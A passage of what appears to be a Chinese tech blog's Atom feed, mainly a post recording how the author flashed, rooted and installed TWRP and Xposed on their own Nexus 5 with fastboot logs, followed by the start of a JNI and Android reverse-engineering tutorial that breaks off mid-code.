637c80c0b6794f9d7d007f604b8d292397a1e9ddc3280780329fd967b259e007cb3d7ebee43143e992ae71ba570c5aff7d2fce9358924a1ac73d51d48cd94c7a6c30260379f5af64fb1f531adca0509aaf58632ae352dec46352e82e08d212b75653203298e018d24a1dece2a4e05506aead5b7b4b028a047fd64818b33bc92438117dc924d1462248e10007680b44c3eb669fb491774effb306790b8385ff6babd2789ab0722a3f4a4752e872c450b31cfc603d9ca8d5b11505707d6741e9a9ecc85badba5a7b030e0f161faf5eebd498d7ffda5b1c2ac0b3f61c6d233203b02da3808b9070de67991549417920bf9aca6e3ac0cacdb26ddecc815e15c6cf7896adb799d17102c8d16202737673dc5d57595630d04bfc3f4fdcabf7cc48b7846631c439d4edca0382fe4a0096729f388a4d313e70e8b43ba7066805cb3ef14406c817369623fabf77a9ece480fba9ae317757ee65437265eff7b042938b4e6ddc6238c5a1b33cb48177821c2ce575a61be654b47fb7b7c8bb6ce6ab51c08dea70b40e6bcd0c072ae85ac8185d68f19d550dec9b417990e68ee41ec8df4e4692d2fd7a86719fa6658bbb93bdc1f9751dbfcef8e3f5d9aa6cce77c91427e4c95d581fe8085ff7a572599a6098dba21b51a8d262dc24ef024caca9cfc98f2d93884b8f3c13d70cec38ff8e2b399d7a8d8074f51ff8db78b262eb257da003fa35cb9ed5c211b8ce81403eef4d4088d14edaaf651d2642c14c41d49fa28f4402846dd0b304cfd8665acf809f022a814817a7bab7238ab438a39e6859c53a90069f81f9fdc664bb3c656d4da5d715f7f5c8982e21112a03e2c41cc3aa5697e46eefde7d13597aa1ff5ec8868b0ba051edadd090a298b44b72e98f421d86e7c933f9bdaed0dde49668b20c4eb71d6f27dd0b88862d3e32c02a41e67818f276ffaee8544409a11bb3317758382a28935d551177c2d755928e2a4b0a7c386dba8ef232019cb16d096dd49e95ff08ecdadc158a969f9ab13961bd357aaaa07d26f4e5bf6eecffe312f3a3db84f0db14de301e01afb7b4ae098cf999884d79b33920e5857a4ddbde94fbd48335e5ed4005f8c9127038e2540f12044124c466e78a97fbd2870a64f38cad04e5a597e7190bf74f62b4176f5f06960450bd0a5c115ad90219d35ed1bb68fa6afeb169d534675d4553e442c6ab9adf363ac4adfdfad0ca71eeedda995517c77324a322e42b730d4c6b4cf6b8d198be87fd8cbc9e229e7f931d273f357fac5e205335c12119b04fe2b9f4b284035b0db1f85f0aa3cd889389b3700c733b161cca934808cb054bf44c55753c81224a960e10370a35f1d89e1da234cf541b41b64b298da594a2d1f3ac95059f12e53b3d8eadd7ffd3443e20f62fc98e79e1d467a83b4f22ff522ed45baa190fca5eca198998365230f8007765761eb703a143feaab500f0368c6f9a359c874f97459b62984e11cb91daa2a571645804b1cf98d1f2a83c2f6150eeb1c3ca68dd24c6b0a0eebe8f2d32dfa04a213fe12439583f121b1c12730619046944a58a02eab1900811a5e1d0cb0ecd0a7ce6ede67c787e4e5b4bdd166e83e64b9b376817892ec27e33dc11232992f6600278f2260d51020d486f6f9ec3ad16b1f357eb84f73e8ba8049b9fdbdf7363cc0c3f452d048fc6fd1009c1d80dd25dd0f70dce8e7fa82bab3de4295c690d343aafefac88cf21908360ce2ee1a68f6063cbb1be31bcc5d250ad7d6c66145b77b881894837066320f58e7b22f9e1957c432512c8fd1f83102878f26acfc14e4ffdc7b82d571f1fd7ad88738ff39c19c94dec1b4cfc1ac5052ebeed4e749e894ae3574e3710028add6d6903ea2d821026563be22c3e051f45a0c4e3e1e678c8c2358f2dd07b24733600a4937e633e5123915849ad2d56111a2b39f036f6da830a9a9e2af6e5e40af56a1640b7f562c28662ebf804366df9d53c979de64f7ba987672d99453a39f1c4e13870f40e32bef756c8a182d7dc229a5ab70e74a102fd67f2a3a663da9c12442470751d9bcc66e51247af005cee9f74b3230a16fc5d6d37955db06587da57a00df88c42380caf6a8f83ad4ff57e255eeeafadfd3ab0b08f32b80686156600d8bc47c2567377cbb5c387208cfa62382dff94b6cafac27068e8ad6d5dcac8e7ee7d48f44758ac65801da74d1dd261337787a9e165de3aa5441264daf024c8341962c3135839dcb5492a63a6fd0a2d3c40aa3f9cac792e9d5de8483a59d8aebfc703f2522f8abec236640ebf80450f7c5d7e7142755c5d7bc92e243b8de688332c5f8d1308b9f1d4ce0f8a1bf4e2cf02bda50f31b92ddbd01a04597328453dd4db3a22beaead38b374be08cfde781f52af735b239b7bdb6aafc2584ca5a737b67e21de3488b99eb88331bc295ed4452c2ec57ab9dfee4885e5d8cd86a6958e6f1292957660285e11ef01f2591c1eb98234929627dd982eb74858c64080fc39fb4f4c0ebbb5fa3ab1d7f0e9be80cd0cfc29dbab0c9efe43a4ef8af4f6dc17bcdb194772998112983fee55825150eb3c4d62abded0b6c98eb90789b325b0b163b7866850da194a1577351a14914b876099990c997abce6ce30b42506922f6502de55f59ea19c5916e7a4d08d01a875fefeb34aebb02957a264d7281ebe9168d4f06e686de1cb1c9b1eafa2b319bc3961203c1f3e2bdca0389b4faa7d446b16fb5c2edc57316f62cead188487037b5e99b79c8c6f4019f238d9fb45216ee0d65f9a2c186f699385d81c0a108c18e0ff149414838744458f7dfa2ee90ae6b660c2347ff3b25e460950daaec51e61fab2b25f27afee12eb014cc3e0c04c618f8ff59f7cc6f3abfa34ed13a260c2934a9963c166072310086d4d8f6e238526d7628a0a512567cb163d194919fa6ce584601f006f1e22202dec167e7de54d3072667e94bdd6b13f5abbf15bd34d7e06e91c8e2cfe1130bb053081f1f9094bb75ef03ba28243bd07e4c13694245ab53de55168445ac61e02f9609cc8f13052fb449ecddf235059b824f6bf899ae01f9badc08d9d5bbedc5e993b893384c1dacb6582da055aca553ec25d3a09ab629ed180c4119f33e1bbb9e3e2ebfb5141189ca280c5c92662890690ab7cb77c74eed1a45b4dda7e6ca059081c606ea76945f2f7a300b95c1b755836e656f1123b1ec0f88f28a0ee31d82606a457d41e14ecbcbd882e302f65a9baa0582ffaae0a3d6cb421a32436db7623fa6b4ba087c5849d9d967cac16b39af62e082a7f70c7f3029e31b967d2da700de634e1d3c4b8855ccad4c9386a310d17aa95df702b73a57bc4b6e01c7749e5242af8c40b1412dcc471fa7bcfd0a42207bb78e5fe1a7030be469a85ddbd1b607d85d80e7ef57c4728086495210be3117ca0115d3ccc6f3d1764738ebf82e763b1adbd929233f6e5f6581b6b4c7e8272160790a84cdd6181734c519612a19c35ee131ddc2883711e34c1957f63ecc95e1f4f97233f0756f86a7dec5d93c0dc6f5bd332f512b6c4ffbdb5f439448eba4cc622dc677c0a6bc2531b11ddfb3a446a0edfeeea</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="android" scheme="https://qianfei11.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Nexus5刷机、Root并安装Xposed框架</title>
    <link href="https://qianfei11.github.io/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/"/>
    <id>https://qianfei11.github.io/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/</id>
    <published>2020-02-05T06:59:47.000Z</published>
    <updated>2020-02-06T02:16:55.913Z</updated>
    
    <content type="html"><![CDATA[<p>在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。</p><a id="more"></a><h1 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h1><p>先使用 adb 命令进入 bootloader 模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br></pre></td></tr></table></figure><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/1.png" alt="bootloader界面样式"></p><p>这部机子一开始已经解锁了，所以会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fastboot oem unlock</span><br><span class="line">                                                   FAILED (remote: <span class="string">'Already Unlocked'</span>)</span><br><span class="line">fastboot: error: Command failed</span><br></pre></td></tr></table></figure><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>刷机一般是采用<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">官方的镜像</a>，搜索 hammerhead，找到需要刷的版本。我一开始用了 Android 5.0.1（LRX22C）的包，但一直没有成功。后来改成低版本的 Android 4.4.3（KTU84M）后，刷机成功。同样需要使用 adb 命令进入 bootloader 界面（也可以使用音量下键+电源键），然后确认有设备后执行镜像包中的 <code>flash-all.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot devices</span><br><span class="line">0b83c85e00ce15f9fastboot</span><br><span class="line"></span><br><span class="line">$ ./flash-all.sh</span><br><span class="line">Sending <span class="string">'bootloader'</span> (2508 KB)                     OKAY [  0.290s]</span><br><span class="line">Writing <span class="string">'bootloader'</span>                               OKAY [  0.497s]</span><br><span class="line">Finished. Total time: 0.981s</span><br><span class="line">Rebooting into bootloader                          OKAY [  0.094s]</span><br><span class="line">Finished. Total time: 0.094s</span><br><span class="line">Sending <span class="string">'radio'</span> (45409 KB)                         OKAY [  1.640s]</span><br><span class="line">Writing <span class="string">'radio'</span>                                    OKAY [  3.105s]</span><br><span class="line">Finished. Total time: 4.975s</span><br><span class="line">Rebooting into bootloader                          OKAY [  0.106s]</span><br><span class="line">Finished. Total time: 0.106s</span><br><span class="line">--------------------------------------------</span><br><span class="line">Bootloader Version...: HHZ11k</span><br><span class="line">Baseband Version.....: M8974A-2.0.50.1.13</span><br><span class="line">Serial Number........: 0b83c85e00ce15f9</span><br><span class="line">--------------------------------------------</span><br><span class="line">extracting android-info.txt (0 MB) to RAM...</span><br><span class="line">Checking <span class="string">'product'</span>                                 OKAY [  0.097s]</span><br><span class="line">Checking <span class="string">'version-bootloader'</span>                      OKAY [  0.100s]</span><br><span class="line">Checking <span class="string">'version-baseband'</span>                        OKAY [  0.100s]</span><br><span class="line">extracting boot.img (8 MB) to disk... took 0.038s</span><br><span class="line">archive does not contain <span class="string">'boot.sig'</span></span><br><span class="line">Sending <span class="string">'boot'</span> (8700 KB)                           OKAY [  0.490s]</span><br><span class="line">Writing <span class="string">'boot'</span>                                     OKAY [  0.749s]</span><br><span class="line">archive does not contain <span class="string">'dtbo.img'</span></span><br><span class="line">archive does not contain <span class="string">'dt.img'</span></span><br><span class="line">extracting recovery.img (9 MB) to disk... took 0.039s</span><br><span class="line">archive does not contain <span class="string">'recovery.sig'</span></span><br><span class="line">Sending <span class="string">'recovery'</span> (9284 KB)                       OKAY [  0.510s]</span><br><span class="line">Writing <span class="string">'recovery'</span>                                 OKAY [  0.776s]</span><br><span class="line">archive does not contain <span class="string">'vbmeta.img'</span></span><br><span class="line">archive does not contain <span class="string">'vbmeta_system.img'</span></span><br><span class="line">archive does not contain <span class="string">'super_empty.img'</span></span><br><span class="line">archive does not contain <span class="string">'odm.img'</span></span><br><span class="line">archive does not contain <span class="string">'product.img'</span></span><br><span class="line">extracting system.img (704 MB) to disk... took 3.704s</span><br><span class="line">archive does not contain <span class="string">'system.sig'</span></span><br><span class="line">Sending <span class="string">'system'</span> (721400 KB)                       OKAY [ 22.834s]</span><br><span class="line">Writing <span class="string">'system'</span>                                   OKAY [ 49.509s]</span><br><span class="line">archive does not contain <span class="string">'system_ext.img'</span></span><br><span class="line">archive does not contain <span class="string">'vendor.img'</span></span><br><span class="line">Erasing <span class="string">'userdata'</span>                                 OKAY [ 15.664s]</span><br><span class="line">mke2fs 1.44.4 (18-Aug-2018)</span><br><span class="line">Creating filesystem with 7137786 4k blocks and 1785856 inodes</span><br><span class="line">Filesystem UUID: bc382e9c-a2d8-4adc-860a-6a31fcf236c3</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,</span><br><span class="line">4096000</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span></span><br><span class="line">Writing inode tables: <span class="keyword">done</span></span><br><span class="line">Creating journal (32768 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Sending <span class="string">'userdata'</span> (4416 KB)                       OKAY [  0.244s]</span><br><span class="line">Writing <span class="string">'userdata'</span>                                 OKAY [  0.495s]</span><br><span class="line">Erasing <span class="string">'cache'</span>                                    OKAY [  0.600s]</span><br><span class="line">mke2fs 1.44.4 (18-Aug-2018)</span><br><span class="line">Creating filesystem with 179200 4k blocks and 44832 inodes</span><br><span class="line">Filesystem UUID: 773d6dcf-5df9-40ae-8ffc-9f7f947e275d</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">32768, 98304, 163840</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span></span><br><span class="line">Writing inode tables: <span class="keyword">done</span></span><br><span class="line">Creating journal (4096 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Sending <span class="string">'cache'</span> (428 KB)                           OKAY [  0.211s]</span><br><span class="line">Writing <span class="string">'cache'</span>                                    OKAY [  0.219s]</span><br><span class="line">Rebooting                                          OKAY [  0.100s]</span><br><span class="line">Finished. Total time: 100.120s</span><br></pre></td></tr></table></figure><p>完成后，如果没有什么故障，稍过片刻就能打开新的系统了。</p><blockquote><p>我刷完后的系统打开后只有 256MB 可用空间，搜了一下，需要在 recovery mode 下对 <code>/data</code> 和 <code>/cache</code> 进行格式化，照着<a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">这篇文章</a>对系统进行双清后，容量恢复到了正常状态。</p></blockquote><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/2.png" alt="recovery mode界面样式"></p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/3.png" alt="进行格式化"></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>刷完机后，可以进行 root 了。下载 Android Root 包 <a href="https://autoroot.chainfire.eu/" target="_blank" rel="noopener">CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a> 并解压进入目录。在 macOS 下时，提供的 fastbootm-mac 的版本过老，使用时会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tools/fastboot-mac --version</span><br><span class="line">fastboot version 09a0d98bebce-android</span><br></pre></td></tr></table></figure><p>本地的 fastboot 版本更新，所以我把 tools 中的工具替换为了本地的 /usr/local/bin/fastboot：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fastboot --version</span><br><span class="line">fastboot version 29.0.2-5738569</span><br><span class="line">Installed as /usr/local/bin/fastboot</span><br></pre></td></tr></table></figure><p>然后进入 bootloader，并执行 root-mac.sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ ./root-mac.sh</span><br><span class="line"></span><br><span class="line">----- CF-Auto-Root-hammerhead-hammerhead-nexus5 -----</span><br><span class="line"></span><br><span class="line">If you are on Android 5.0 or newer, please make sure the &quot;Allow OEM Unlock&quot;</span><br><span class="line">option (if present) is enabled in &quot;Settings-&gt;Developer Options&quot;.</span><br><span class="line"></span><br><span class="line">If you cannot find &quot;Developer Options&quot; under &quot;Settings&quot;, first go to the</span><br><span class="line">&quot;Settings-&gt;About&quot; screen, find the &quot;Build number&quot; entry, and tap it 7 times.</span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">Please make sure your device is in bootloader/fastboot mode before continuing.</span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">***WARNING*** ALL YOUR DATA *MAY* BE WIPED ! ***WARNING***</span><br><span class="line"></span><br><span class="line">We are going to run the &quot;OEM UNLOCK&quot; command on your device. If your device</span><br><span class="line">was not previously unlocked, this will wipe all your data !</span><br><span class="line"></span><br><span class="line">Please watch the screen on your device, user input may be required.</span><br><span class="line"></span><br><span class="line">You may need to enter your administrator password to continue.</span><br><span class="line"></span><br><span class="line">Press Ctrl+C to cancel !</span><br><span class="line"></span><br><span class="line">Press ENTER to continue</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">If you just unlocked for the first time, it is advised to boot the device into</span><br><span class="line">Android before continuing. This first boot may take several minutes, sometimes</span><br><span class="line">even half an hour.</span><br><span class="line"></span><br><span class="line">If you decide to boot back into Android first, return your device to</span><br><span class="line">bootloader/fastboot mode before continuing again.</span><br><span class="line"></span><br><span class="line">Press Ctrl+C to cancel !</span><br><span class="line"></span><br><span class="line">Press ENTER to continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">We will now attempt to boot CF-Auto-Root. You should see a red Android on the</span><br><span class="line">screen of your device in a minute, with scrolling white text on top of it.</span><br><span class="line"></span><br><span class="line">Sending &apos;boot.img&apos; (15868 KB)                      OKAY [  0.605s]</span><br><span class="line">Booting                                            OKAY [  0.121s]</span><br><span class="line">Finished. Total time: 0.747s</span><br><span class="line"></span><br><span class="line">If nothing happens even after several minutes, something may be wrong.</span><br><span class="line"></span><br><span class="line">Once CF-Auto-Root is done, it will reboot your device. Keep in mind that your</span><br><span class="line">device may reboot a number of times, and it may be a few minutes before you</span><br><span class="line">are back into Android. It is important that you do not interrupt this process,</span><br><span class="line">unless it takes more than five minutes in total.</span><br><span class="line"></span><br><span class="line">Press ENTER to continue</span><br></pre></td></tr></table></figure><p>成功后，手机会出现一个红色的安卓标志：</p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/4.png" alt="Root成功"></p><p>打开手机后，会发现多了一个 app 叫 SuperSu。使用 adb 连接，并用 su 命令切换到 root：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">shell@hammerhead:/ $ su</span><br><span class="line">root@hammerhead:/ # id</span><br><span class="line">uid=0(root) gid=0(root) context=u:r:init:s0</span><br><span class="line">root@hammerhead:/ #</span><br></pre></td></tr></table></figure><h1 id="TWRP"><a href="#TWRP" class="headerlink" title="TWRP"></a>TWRP</h1><p>下载 <a href="https://twrp.me/lg/lgnexus5.html" target="_blank" rel="noopener">twrp-3.3.1-0-hammerhead.img</a>，进入 bootloader，并用 fastboot 刷入这个第三方 Recovery，然后重启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot flash recovery twrp-3.3.1-0-hammerhead.img</span><br><span class="line">Sending &apos;recovery&apos; (13290 KB)                      OKAY [  0.630s]</span><br><span class="line">Writing &apos;recovery&apos;                                 OKAY [  1.040s]</span><br><span class="line">Finished. Total time: 1.863s</span><br><span class="line"></span><br><span class="line">$ fastboot reboot</span><br><span class="line">Rebooting                                          OKAY [  0.001s]</span><br><span class="line">Finished. Total time: 0.001s</span><br></pre></td></tr></table></figure><h1 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h1><p>Android 4.0.3~Android 4.4 的版本不支持 sdk21 及以上的版本，通过直接下载 <a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">Xposed Installer</a> 来安装 Xposed 框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb install apks/de.robv.android.xposed.installer_v33_36570c.apk</span><br><span class="line">Performing Push Install</span><br><span class="line">apks/de.robv.android.xposed.installer_v33_36570c.apk: 1 file pushed. 6.7 MB/s (788771 bytes in 0.113s)</span><br><span class="line">pkg: /data/local/tmp/de.robv.android.xposed.installer_v33_36570c.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bodkin.ren/index.php/archives/513/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/513/</a><br><a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">https://jilu.wiki/d/177</a><br><a href="https://blog.csdn.net/feiniao8651/article/details/70083246/" target="_blank" rel="noopener">https://blog.csdn.net/feiniao8651/article/details/70083246/</a><br><a href="https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193" target="_blank" rel="noopener">https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193</a><br><a href="https://sspai.com/post/24538" target="_blank" rel="noopener">https://sspai.com/post/24538</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="android" scheme="https://qianfei11.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（二）</title>
    <link href="https://qianfei11.github.io/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-01-31T08:10:49.000Z</published>
    <updated>2020-02-06T02:41:02.303Z</updated>
    
    <content type="html"><![CDATA[<p>Android JNI 编程及 ARM 汇编入门。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Android Studio 3.5.3</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>Android 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。</p><p><img src="/pics/Android逆向入门/二/1.png" alt="Java通过调用JNI程序来调用原声函数"></p><p>如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 <code>log.h</code> 定义几个在 C++ 文件中进行日志输出的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LOG_TAG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"MY_TAG"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在 Java 文件中添加日志输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        Log.d(<span class="string">"Debug"</span>, <span class="string">"infomation"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要调用 JNI 的函数中加载动态库：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span 